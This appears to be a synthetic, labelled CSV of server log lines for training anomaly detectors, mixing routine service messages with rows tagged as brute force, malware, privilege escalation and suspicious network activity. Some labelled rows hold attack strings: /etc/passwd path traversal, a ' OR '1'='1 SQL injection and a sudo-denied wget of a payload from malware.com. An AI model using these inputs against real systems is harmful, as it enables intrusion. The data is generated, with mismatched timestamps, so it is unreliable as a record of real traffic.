timestamp,log_message,label,anomaly_type
2026-01-03 21:05:34,MySQL server started with process id 59053,0,normal
2026-01-03 21:05:40,"192.168.222.168 - - [03/Jan/2026:21:03:54 +0700] ""GET / HTTP/1.1"" 200 38648",0,normal
2026-01-03 21:05:40,[INFO] Application started successfully,0,normal
2026-01-03 21:05:55,kernel: [422.202444] wlan0: link up,0,normal
2026-01-03 21:05:59,kernel: [302.892094] docker0: link up,0,normal
2026-01-03 21:06:10,kernel: [74.384673] eth1: link down,0,normal
2026-01-03 21:06:13,kernel: [814.681239] docker0: link up,0,normal
2026-01-03 21:06:17,[INFO] Request processed in 412ms,0,normal
2026-01-03 21:06:20,session closed for user root,0,normal
2026-01-03 21:06:29,systemd[1]: Stopped cron.service,0,normal
2026-01-03 21:06:39,[INFO] Request processed in 2900ms,0,normal
2026-01-03 21:06:55,[ERROR] Disk space critical: /home at 93% usage,1,system_error
2026-01-03 21:07:21,"192.168.48.110 - - [03/Jan/2026:22:39:14 +0700] ""POST /api/v1/data HTTP/1.1"" 200 36712",0,normal
2026-01-03 21:07:31,[DEBUG] Processing request from 192.168.4.193,0,normal
2026-01-03 21:08:25,"192.168.173.1 - - [03/Jan/2026:19:11:09 +0700] ""POST /api/v1/data HTTP/1.1"" 200 40308",0,normal
2026-01-03 21:08:29,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:08:29,Connection received: host=192.168.173.225 user=postgres database=staging,0,normal
2026-01-03 21:08:40,Received disconnect from 192.168.100.100 port 27047:11: disconnected by user,0,normal
2026-01-03 21:08:42,[INFO] Application started successfully,0,normal
2026-01-03 21:09:00,kernel: [26.378017] docker0: link down,0,normal
2026-01-03 21:09:08,session opened for user postgres by (uid=0),0,normal
2026-01-03 21:09:25,[INFO] User user logged in successfully,0,normal
2026-01-03 21:09:42,[INFO] Request processed in 1486ms,0,normal
2026-01-03 21:10:03,kernel: [163.984497] wlan0: link down,0,normal
2026-01-03 21:10:30,"192.168.14.228 - - [03/Jan/2026:21:19:19 +0700] ""GET /dashboard HTTP/1.1"" 200 17532",0,normal
2026-01-03 21:10:45,[INFO] User guest logged in successfully,0,normal
2026-01-03 21:10:45,[INFO] Application started successfully,0,normal
2026-01-03 21:10:51,Connection received: host=192.168.234.171 user=nginx database=analytics,0,normal
2026-01-03 21:11:02,[DEBUG] Processing request from 192.168.222.38,0,normal
2026-01-03 21:11:09,session opened for user user by (uid=0),0,normal
2026-01-03 21:11:24,"192.168.131.139 - - [03/Jan/2026:15:34:18 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 17012",0,normal
2026-01-03 21:11:24,systemd[1]: Starting redis.service...,0,normal
2026-01-03 21:11:24,[INFO] Application started successfully,0,normal
2026-01-03 21:11:31,"192.168.47.222 - - [04/Jan/2026:01:23:02 +0700] ""POST /api/v1/users HTTP/1.1"" 200 38188",0,normal
2026-01-03 21:11:33,"192.168.210.86 - - [03/Jan/2026:22:39:54 +0700] ""POST /index.html HTTP/1.1"" 200 29229",0,normal
2026-01-03 21:11:35,[INFO] Application started successfully,0,normal
2026-01-03 21:11:40,MySQL server started with process id 5776,0,normal
2026-01-03 21:11:54,[DEBUG] Processing request from 192.168.56.97,0,normal
2026-01-03 21:11:55,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 21:11:57,[DEBUG] Processing request from 192.168.74.148,0,normal
2026-01-03 21:12:17,"192.168.206.40 - - [04/Jan/2026:02:57:39 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-03 21:12:20,MySQL server started with process id 60663,0,normal
2026-01-03 21:12:37,Accepted password for admin from 192.168.123.217 port 27344 ssh2,0,normal
2026-01-03 21:12:45,kernel: [468.650817] eth1: link down,0,normal
2026-01-03 21:12:50,session opened for user postgres by (uid=0),0,normal
2026-01-03 21:12:58,"45.33.64.21 - - [04/Jan/2026:08:16:25 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 34648",1,suspicious_network
2026-01-03 21:12:58,"kernel: [447.492815] I/O error, dev docker0, sector 6641038",1,system_error
2026-01-03 21:13:08,session closed for user user,0,normal
2026-01-03 21:13:15,session closed for user postgres,0,normal
2026-01-03 21:13:24,Accepted password for apache from 192.168.105.32 port 49460 ssh2,0,normal
2026-01-03 21:13:30,Accepted password for root from 192.168.159.14 port 55741 ssh2,0,normal
2026-01-03 21:13:41,WARNING: Unauthorized file modification: /api/v1/users,1,malware_indicator
2026-01-03 21:13:56,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:14:03,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:14:19,"192.168.43.130 - - [03/Jan/2026:15:31:30 +0700] ""POST /images/logo.png HTTP/1.1"" 200 5172",0,normal
2026-01-03 21:14:27,"192.168.120.153 - - [03/Jan/2026:21:40:03 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-03 21:14:33,systemd[1]: Started redis.service,0,normal
2026-01-03 21:14:36,Received disconnect from 192.168.73.191 port 22118:11: disconnected by user,0,normal
2026-01-03 21:14:56,systemd[1]: Started apache2.service,0,normal
2026-01-03 21:15:20,[INFO] Request processed in 202ms,0,normal
2026-01-03 21:15:38,"192.168.228.121 - - [03/Jan/2026:18:13:35 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-03 21:15:54,[INFO] Request processed in 1361ms,0,normal
2026-01-03 21:16:08,[INFO] Cache hit for key: cache_key_593,0,normal
2026-01-03 21:16:11,DDoS attack detected from 185.220.205.225 - rate limit exceeded,1,suspicious_network
2026-01-03 21:16:13,[INFO] User nginx logged in successfully,0,normal
2026-01-03 21:16:14,"192.168.124.159 - - [03/Jan/2026:16:31:28 +0700] ""GET /css/style.css HTTP/1.1"" 200 29119",0,normal
2026-01-03 21:16:15,Accepted password for postgres from 192.168.52.65 port 53022 ssh2,0,normal
2026-01-03 21:16:16,"192.168.224.158 - - [04/Jan/2026:05:34:18 +0700] ""POST /css/style.css HTTP/1.1"" 200 577",0,normal
2026-01-03 21:16:17,"104.248.250.185 - - [04/Jan/2026:08:19:28 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 32016",1,suspicious_network
2026-01-03 21:16:26,MySQL server started with process id 62040,0,normal
2026-01-03 21:16:45,"192.168.208.22 - - [04/Jan/2026:11:14:01 +0700] ""GET /css/style.css HTTP/1.1"" 200 6357",0,normal
2026-01-03 21:16:46,MySQL server started with process id 17396,0,normal
2026-01-03 21:16:53,systemd[1]: Started postgresql.service,0,normal
2026-01-03 21:16:58,systemd[1]: Starting apache2.service...,0,normal
2026-01-03 21:17:00,Connection received: host=192.168.224.135 user=apache database=production,0,normal
2026-01-03 21:17:00,systemd[1]: Started redis.service,0,normal
2026-01-03 21:17:22,kernel: [222.243065] docker0: link down,0,normal
2026-01-03 21:17:57,"185.220.177.182 - - [04/Jan/2026:12:08:13 +0700] ""GET /admin HTTP/1.1"" 403 30885",1,suspicious_network
2026-01-03 21:18:07,"192.168.111.67 - - [03/Jan/2026:15:45:29 +0700] ""GET /index.html HTTP/1.1"" 200 49640",0,normal
2026-01-03 21:18:21,Connection received: host=192.168.48.154 user=postgres database=test,0,normal
2026-01-03 21:18:24,kernel: [668.704101] eth1: link up,0,normal
2026-01-03 21:18:24,[INFO] Application started successfully,0,normal
2026-01-03 21:18:37,root: user NOT in sudoers; TTY=pts/0; PWD=/home/root; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-03 21:18:40,"192.168.253.136 - - [04/Jan/2026:05:21:19 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-03 21:19:07,[INFO] Request processed in 1608ms,0,normal
2026-01-03 21:19:18,Accepted password for mysql from 192.168.134.181 port 34828 ssh2,0,normal
2026-01-03 21:19:29,kernel: [298.701022] br-0: link up,0,normal
2026-01-03 21:19:29,systemd[1]: Stopped mongodb.service,0,normal
2026-01-03 21:19:32,session closed for user user,0,normal
2026-01-03 21:19:37,systemd[1]: Started postgresql.service,0,normal
2026-01-03 21:20:23,systemd[1]: Starting docker.service...,0,normal
2026-01-03 21:20:34,[DEBUG] Processing request from 192.168.15.144,0,normal
2026-01-03 21:20:47,systemd[1]: Stopped mongodb.service,0,normal
2026-01-03 21:20:50,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.96.97,1,brute_force
2026-01-03 21:20:57,[INFO] Application started successfully,0,normal
2026-01-03 21:21:19,[INFO] Cache hit for key: cache_key_819,0,normal
2026-01-03 21:21:21,[INFO] Request processed in 1846ms,0,normal
2026-01-03 21:21:42,Received disconnect from 192.168.185.210 port 10976:11: disconnected by user,0,normal
2026-01-03 21:21:51,MySQL server started with process id 11035,0,normal
2026-01-03 21:21:59,[DEBUG] Processing request from 192.168.167.10,0,normal
2026-01-03 21:22:03,Accepted password for mysql from 192.168.249.129 port 50959 ssh2,0,normal
2026-01-03 21:22:04,[INFO] User www-data logged in successfully,0,normal
2026-01-03 21:22:17,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 21:22:23,[INFO] Request processed in 4651ms,0,normal
2026-01-03 21:22:30,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:22:41,systemd[1]: apache2.service failed,1,system_error
2026-01-03 21:22:56,kernel: [820.343330] eth0: link down,0,normal
2026-01-03 21:23:11,[INFO] Application started successfully,0,normal
2026-01-03 21:23:21,[INFO] Request processed in 492ms,0,normal
2026-01-03 21:23:41,"192.168.112.220 - - [04/Jan/2026:13:47:42 +0700] ""POST /api/v1/data HTTP/1.1"" 200 19333",0,normal
2026-01-03 21:23:43,MySQL server started with process id 3204,0,normal
2026-01-03 21:24:03,[INFO] Application started successfully,0,normal
2026-01-03 21:24:05,MySQL server started with process id 27474,0,normal
2026-01-03 21:24:12,error: maximum authentication attempts exceeded for admin from 45.33.85.65,1,brute_force
2026-01-03 21:24:12,"192.168.108.197 - - [04/Jan/2026:03:46:38 +0700] ""GET /css/style.css HTTP/1.1"" 200 569",0,normal
2026-01-03 21:24:29,systemd[1]: Starting postgresql.service...,0,normal
2026-01-03 21:24:41,[ERROR] Disk space critical: /home at 99% usage,1,system_error
2026-01-03 21:24:42,Accepted password for postgres from 192.168.58.101 port 20484 ssh2,0,normal
2026-01-03 21:24:42,[INFO] User apache logged in successfully,0,normal
2026-01-03 21:24:50,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:24:55,Accepted password for guest from 192.168.65.66 port 48892 ssh2,0,normal
2026-01-03 21:24:57,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:25:00,WARNING: Cryptominer activity detected on process 39313,1,malware_indicator
2026-01-03 21:25:08,Received disconnect from 192.168.128.96 port 50019:11: disconnected by user,0,normal
2026-01-03 21:25:17,Accepted password for www-data from 192.168.147.89 port 24585 ssh2,0,normal
2026-01-03 21:25:23,[INFO] Application started successfully,0,normal
2026-01-03 21:26:09,systemd[1]: Starting mongodb.service...,0,normal
2026-01-03 21:26:11,systemd[1]: Stopped mysql.service,0,normal
2026-01-03 21:26:29,"192.168.6.71 - - [04/Jan/2026:00:34:34 +0700] ""POST /images/logo.png HTTP/1.1"" 200 39767",0,normal
2026-01-03 21:27:08,kernel: [487.178360] br-0: link down,0,normal
2026-01-03 21:27:28,"192.42.161.59 - - [04/Jan/2026:00:35:32 +0700] ""POST /login HTTP/1.1"" 401 27168",1,suspicious_network
2026-01-03 21:27:39,session opened for user guest by (uid=0),0,normal
2026-01-03 21:27:39,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:27:52,session closed for user guest,0,normal
2026-01-03 21:27:56,session closed for user apache,0,normal
2026-01-03 21:28:05,Accepted password for mysql from 192.168.69.231 port 49190 ssh2,0,normal
2026-01-03 21:28:30,[INFO] User mysql logged in successfully,0,normal
2026-01-03 21:28:32,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:29:08,[INFO] Application started successfully,0,normal
2026-01-03 21:29:10,[DEBUG] Processing request from 192.168.131.199,0,normal
2026-01-03 21:29:56,ALERT: Reverse shell connection attempt to 104.248.207.101:28515,1,malware_indicator
2026-01-03 21:29:59,kernel: [375.836875] br-0: link down,0,normal
2026-01-03 21:30:08,"192.168.70.227 - - [04/Jan/2026:09:51:00 +0700] ""POST /css/style.css HTTP/1.1"" 200 19264",0,normal
2026-01-03 21:30:16,Connection received: host=192.168.11.181 user=mysql database=staging,0,normal
2026-01-03 21:30:17,[DEBUG] Processing request from 192.168.75.79,0,normal
2026-01-03 21:30:17,Connection received: host=192.168.120.214 user=guest database=users,0,normal
2026-01-03 21:30:18,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:30:25,[INFO] Cache hit for key: cache_key_199,0,normal
2026-01-03 21:30:30,"192.168.93.93 - - [04/Jan/2026:06:38:36 +0700] ""POST /images/logo.png HTTP/1.1"" 200 1399",0,normal
2026-01-03 21:30:43,systemd[1]: Started mongodb.service,0,normal
2026-01-03 21:30:52,"192.168.132.205 - - [04/Jan/2026:11:21:02 +0700] ""POST /dashboard HTTP/1.1"" 200 17742",0,normal
2026-01-03 21:31:00,session closed for user nginx,0,normal
2026-01-03 21:31:14,MySQL server started with process id 44954,0,normal
2026-01-03 21:31:16,"192.168.2.206 - - [03/Jan/2026:20:14:17 +0700] ""POST /dashboard HTTP/1.1"" 200 36622",0,normal
2026-01-03 21:31:26,[INFO] User nginx logged in successfully,0,normal
2026-01-03 21:31:38,"192.168.1.37 - - [03/Jan/2026:21:08:23 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 14109",0,normal
2026-01-03 21:31:46,session opened for user mysql by (uid=0),0,normal
2026-01-03 21:31:50,Connection received: host=192.168.203.8 user=www-data database=test,0,normal
2026-01-03 21:31:51,[INFO] User admin logged in successfully,0,normal
2026-01-03 21:32:13,[INFO] Application started successfully,0,normal
2026-01-03 21:32:14,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:32:29,[INFO] Request processed in 973ms,0,normal
2026-01-03 21:33:02,Accepted password for root from 192.168.33.172 port 32864 ssh2,0,normal
2026-01-03 21:33:56,Received disconnect from 192.168.161.81 port 1721:11: disconnected by user,0,normal
2026-01-03 21:34:15,"192.168.151.34 - - [03/Jan/2026:23:17:42 +0700] ""POST /index.html HTTP/1.1"" 200 46171",0,normal
2026-01-03 21:34:22,kernel: [74.288350] br-0: link up,0,normal
2026-01-03 21:34:39,session opened for user root by (uid=0),0,normal
2026-01-03 21:34:46,MySQL server started with process id 6401,0,normal
2026-01-03 21:34:57,kernel: [783.779382] docker0: link down,0,normal
2026-01-03 21:35:01,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:35:01,Connection received: host=192.168.43.114 user=mysql database=production,0,normal
2026-01-03 21:35:07,session closed for user nginx,0,normal
2026-01-03 21:35:14,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:35:39,systemd[1]: Started redis.service,0,normal
2026-01-03 21:35:41,systemd[1]: Started docker.service,0,normal
2026-01-03 21:35:57,[DEBUG] Processing request from 192.168.2.158,0,normal
2026-01-03 21:36:01,Accepted password for nginx from 192.168.243.172 port 38168 ssh2,0,normal
2026-01-03 21:36:06,WARNING: Cryptominer activity detected on process 44024,1,malware_indicator
2026-01-03 21:36:10,kernel: [708.798331] wlan0: link down,0,normal
2026-01-03 21:36:34,"192.168.13.1 - - [03/Jan/2026:16:10:17 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-03 21:36:42,[INFO] Cache hit for key: cache_key_377,0,normal
2026-01-03 21:36:52,PAM: Authentication failure for mysql from 104.248.214.186,1,brute_force
2026-01-03 21:37:03,[INFO] Request processed in 4067ms,0,normal
2026-01-03 21:37:36,Received disconnect from 192.168.32.28 port 9802:11: disconnected by user,0,normal
2026-01-03 21:37:50,"192.168.202.97 - - [04/Jan/2026:05:18:52 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-03 21:38:02,"kernel: [121.104488] I/O error, dev eth0, sector 9721415",1,system_error
2026-01-03 21:38:02,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 21:38:06,session closed for user postgres,0,normal
2026-01-03 21:38:10,[DEBUG] Processing request from 192.168.167.14,0,normal
2026-01-03 21:38:18,Connection received: host=192.168.234.34 user=guest database=users,0,normal
2026-01-03 21:38:19,systemd[1]: Starting mysql.service...,0,normal
2026-01-03 21:38:22,[INFO] Application started successfully,0,normal
2026-01-03 21:38:33,systemd[1]: Started redis.service,0,normal
2026-01-03 21:38:45,session opened for user admin by (uid=0),0,normal
2026-01-03 21:38:56,Failed password for admin from 104.248.183.122 port 32634 ssh2,1,brute_force
2026-01-03 21:39:09,[INFO] User mysql logged in successfully,0,normal
2026-01-03 21:39:16,MySQL server started with process id 53688,0,normal
2026-01-03 21:39:25,session opened for user mysql by (uid=0),0,normal
2026-01-03 21:39:35,[INFO] User postgres logged in successfully,0,normal
2026-01-03 21:39:46,systemd[1]: Stopped apache2.service,0,normal
2026-01-03 21:39:48,session closed for user www-data,0,normal
2026-01-03 21:40:23,[INFO] Application started successfully,0,normal
2026-01-03 21:40:38,MySQL server started with process id 61763,0,normal
2026-01-03 21:40:39,session opened for user user by (uid=0),0,normal
2026-01-03 21:40:42,"192.168.112.33 - - [04/Jan/2026:12:19:45 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-03 21:41:03,Connection received: host=192.168.60.252 user=postgres database=production,0,normal
2026-01-03 21:41:13,systemd[1]: Started ssh.service,0,normal
2026-01-03 21:41:19,[DEBUG] Processing request from 192.168.168.235,0,normal
2026-01-03 21:41:21,systemd[1]: Stopped ssh.service,0,normal
2026-01-03 21:41:28,"192.168.48.235 - - [04/Jan/2026:10:59:44 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-03 21:41:34,session opened for user admin by (uid=0),0,normal
2026-01-03 21:41:48,session closed for user postgres,0,normal
2026-01-03 21:42:02,Accepted password for guest from 192.168.191.6 port 50727 ssh2,0,normal
2026-01-03 21:42:04,Connection received: host=192.168.139.62 user=postgres database=analytics,0,normal
2026-01-03 21:42:12,[INFO] Cache hit for key: cache_key_628,0,normal
2026-01-03 21:42:28,"185.220.112.11 - - [04/Jan/2026:11:00:00 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 20019",1,suspicious_network
2026-01-03 21:42:41,systemd[1]: Starting mysql.service...,0,normal
2026-01-03 21:42:46,kernel: [821.609442] wlan0: link up,0,normal
2026-01-03 21:42:49,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:43:06,Accepted password for mysql from 192.168.115.35 port 48097 ssh2,0,normal
2026-01-03 21:43:09,Failed password for root from 192.42.217.87 port 18385 ssh2,1,brute_force
2026-01-03 21:43:29,DDoS attack detected from 45.33.143.197 - rate limit exceeded,1,suspicious_network
2026-01-03 21:43:40,Accepted password for postgres from 192.168.118.228 port 30437 ssh2,0,normal
2026-01-03 21:43:40,kernel: BUG: soft lockup - CPU#3 stuck for 4759s!,1,system_error
2026-01-03 21:43:49,"192.168.215.192 - - [03/Jan/2026:23:05:44 +0700] ""POST /dashboard HTTP/1.1"" 200 32410",0,normal
2026-01-03 21:43:50,session closed for user user,0,normal
2026-01-03 21:43:50,systemd[1]: Stopped nginx.service,0,normal
2026-01-03 21:44:21,[DEBUG] Processing request from 192.168.171.145,0,normal
2026-01-03 21:44:22,systemd[1]: Stopped mysql.service,0,normal
2026-01-03 21:44:35,systemd[1]: Starting postgresql.service...,0,normal
2026-01-03 21:44:38,Connection received: host=192.168.219.93 user=guest database=test,0,normal
2026-01-03 21:44:54,[INFO] Request processed in 715ms,0,normal
2026-01-03 21:45:09,systemd[1]: Starting postgresql.service...,0,normal
2026-01-03 21:45:10,[DEBUG] Processing request from 192.168.49.92,0,normal
2026-01-03 21:45:14,"192.168.187.107 - - [04/Jan/2026:11:50:26 +0700] ""POST /admin HTTP/1.1"" 200 13953",0,normal
2026-01-03 21:45:16,kernel: [198.748758] br-0: link down,0,normal
2026-01-03 21:45:19,kernel: [586.653313] eth1: link down,0,normal
2026-01-03 21:45:19,sudo: guest : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=wget http://malware.com/payload,1,privilege_escalation
2026-01-03 21:45:20,[INFO] Application started successfully,0,normal
2026-01-03 21:45:29,systemd[1]: Started mysql.service,0,normal
2026-01-03 21:45:33,[INFO] Cache hit for key: cache_key_97,0,normal
2026-01-03 21:45:40,kernel: [595.705076] eth1: link down,0,normal
2026-01-03 21:45:49,Failed password for guest from 185.220.193.93 port 27757 ssh2,1,brute_force
2026-01-03 21:45:56,Received disconnect from 192.168.7.187 port 52373:11: disconnected by user,0,normal
2026-01-03 21:46:27,Connection received: host=192.168.9.46 user=admin database=test,0,normal
2026-01-03 21:46:28,Received disconnect from 192.168.67.78 port 39106:11: disconnected by user,0,normal
2026-01-03 21:46:31,systemd[1]: Started docker.service,0,normal
2026-01-03 21:46:33,[INFO] Cache hit for key: cache_key_982,0,normal
2026-01-03 21:46:46,kernel: [407.750265] eth0: link down,0,normal
2026-01-03 21:46:54,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:46:55,systemd[1]: Started docker.service,0,normal
2026-01-03 21:47:03,DDoS attack detected from 185.220.134.130 - rate limit exceeded,1,suspicious_network
2026-01-03 21:47:16,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:47:22,session opened for user mysql by (uid=0),0,normal
2026-01-03 21:47:25,"192.168.188.142 - - [04/Jan/2026:00:08:35 +0700] ""POST /dashboard HTTP/1.1"" 200 42259",0,normal
2026-01-03 21:47:46,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:47:52,[INFO] Request processed in 3779ms,0,normal
2026-01-03 21:48:32,error: maximum authentication attempts exceeded for guest from 185.220.16.12,1,brute_force
2026-01-03 21:48:47,Connection received: host=192.168.241.210 user=mysql database=production,0,normal
2026-01-03 21:48:48,"192.168.208.16 - - [04/Jan/2026:06:04:01 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-03 21:49:13,Received disconnect from 192.168.212.57 port 28081:11: disconnected by user,0,normal
2026-01-03 21:49:58,Failed password for invalid user mysql from 185.220.229.164 port 44647 ssh2,1,brute_force
2026-01-03 21:49:58,[INFO] Application started successfully,0,normal
2026-01-03 21:50:03,kernel: [633.510380] eth0: link down,0,normal
2026-01-03 21:50:05,kernel: [167.659565] wlan0: link down,0,normal
2026-01-03 21:50:25,systemd[1]: Starting docker.service...,0,normal
2026-01-03 21:50:34,ALERT: Reverse shell connection attempt to 192.42.78.133:33730,1,malware_indicator
2026-01-03 21:50:39,[DEBUG] Processing request from 192.168.66.250,0,normal
2026-01-03 21:50:55,Accepted password for admin from 192.168.104.157 port 5803 ssh2,0,normal
2026-01-03 21:50:57,Connection received: host=192.168.111.86 user=apache database=analytics,0,normal
2026-01-03 21:51:13,Received disconnect from 192.168.157.193 port 19093:11: disconnected by user,0,normal
2026-01-03 21:51:33,"192.168.87.46 - - [03/Jan/2026:17:41:53 +0700] ""POST /images/logo.png HTTP/1.1"" 200 37476",0,normal
2026-01-03 21:51:39,MySQL server started with process id 48158,0,normal
2026-01-03 21:51:59,session opened for user user by (uid=0),0,normal
2026-01-03 21:52:19,[INFO] User guest logged in successfully,0,normal
2026-01-03 21:52:54,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:52:57,[INFO] Cache hit for key: cache_key_435,0,normal
2026-01-03 21:53:07,kernel: [122.320521] wlan0: link down,0,normal
2026-01-03 21:53:14,[DEBUG] Processing request from 192.168.174.1,0,normal
2026-01-03 21:53:21,Connection received: host=192.168.7.203 user=guest database=users,0,normal
2026-01-03 21:53:30,Possible SQL injection attack from 45.33.28.50: ' OR '1'='1,1,suspicious_network
2026-01-03 21:53:43,Received disconnect from 192.168.233.46 port 42716:11: disconnected by user,0,normal
2026-01-03 21:53:48,session closed for user nginx,0,normal
2026-01-03 21:53:51,systemd[1]: Started nginx.service,0,normal
2026-01-03 21:54:02,session closed for user admin,0,normal
2026-01-03 21:54:03,session opened for user guest by (uid=0),0,normal
2026-01-03 21:54:10,systemd[1]: Starting nginx.service...,0,normal
2026-01-03 21:54:11,kernel: [99.618951] br-0: link down,0,normal
2026-01-03 21:54:17,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 21:54:57,kernel: [576.654942] wlan0: link up,0,normal
2026-01-03 21:55:28,kernel: [80.304735] eth1: link up,0,normal
2026-01-03 21:55:32,[INFO] Application started successfully,0,normal
2026-01-03 21:55:37,"192.168.200.189 - - [04/Jan/2026:04:36:20 +0700] ""POST /css/style.css HTTP/1.1"" 200 49498",0,normal
2026-01-03 21:55:43,kernel: [195.220449] docker0: link down,0,normal
2026-01-03 21:55:45,WARNING: Unauthorized file modification: /,1,malware_indicator
2026-01-03 21:56:20,[INFO] Cache hit for key: cache_key_38,0,normal
2026-01-03 21:56:22,su: FAILED SU (to root) postgres on pts/0,1,privilege_escalation
2026-01-03 21:56:32,MySQL server started with process id 13492,0,normal
2026-01-03 21:56:44,systemd[1]: Starting mysql.service...,0,normal
2026-01-03 21:56:44,kernel: [280.672176] wlan0: link down,0,normal
2026-01-03 21:56:46,systemd[1]: Starting mongodb.service...,0,normal
2026-01-03 21:56:54,[INFO] Application started successfully,0,normal
2026-01-03 21:57:00,systemd[1]: Started mysql.service,0,normal
2026-01-03 21:57:03,[INFO] Request processed in 1565ms,0,normal
2026-01-03 21:57:14,Blocked suspicious request from 45.33.36.225: /api/v1/users,1,suspicious_network
2026-01-03 21:57:22,"192.168.56.253 - - [03/Jan/2026:20:53:48 +0700] ""GET /css/style.css HTTP/1.1"" 200 25208",0,normal
2026-01-03 21:57:24,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 21:57:33,[INFO] Request processed in 2777ms,0,normal
2026-01-03 21:57:34,[INFO] Request processed in 4837ms,0,normal
2026-01-03 21:57:50,kernel: [839.384258] wlan0: link down,0,normal
2026-01-03 21:58:12,systemd[1]: Stopped postgresql.service,0,normal
2026-01-03 21:58:25,systemd[1]: Starting cron.service...,0,normal
2026-01-03 21:58:42,[INFO] Request processed in 249ms,0,normal
2026-01-03 21:59:26,systemd[1]: Stopped cron.service,0,normal
2026-01-03 21:59:51,[INFO] User nginx logged in successfully,0,normal
2026-01-03 21:59:56,session closed for user apache,0,normal
2026-01-03 21:59:58,Accepted password for www-data from 192.168.153.205 port 44170 ssh2,0,normal
2026-01-03 22:00:11,session closed for user postgres,0,normal
2026-01-03 22:00:16,[INFO] User root logged in successfully,0,normal
2026-01-03 22:00:20,session opened for user user by (uid=0),0,normal
2026-01-03 22:00:25,Connection received: host=192.168.172.200 user=www-data database=test,0,normal
2026-01-03 22:00:26,PAM: Authentication failure for admin from 192.42.11.213,1,brute_force
2026-01-03 22:00:28,[INFO] Application started successfully,0,normal
2026-01-03 22:00:58,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:01:00,session opened for user root by (uid=0),0,normal
2026-01-03 22:01:12,kernel: [914.130601] wlan0: link down,0,normal
2026-01-03 22:01:13,Connection received: host=192.168.171.209 user=nginx database=analytics,0,normal
2026-01-03 22:01:20,Connection received: host=192.168.59.225 user=apache database=test,0,normal
2026-01-03 22:01:47,Accepted password for mysql from 192.168.248.199 port 23759 ssh2,0,normal
2026-01-03 22:01:52,kernel: BUG: soft lockup - CPU#4 stuck for 1945s!,1,system_error
2026-01-03 22:01:53,"192.168.189.68 - - [03/Jan/2026:23:14:14 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-03 22:01:56,PostgreSQL database system is ready to accept connections,0,normal
2026-01-03 22:01:56,kernel: [335.690816] eth1: link up,0,normal
2026-01-03 22:01:59,[INFO] Cache hit for key: cache_key_269,0,normal
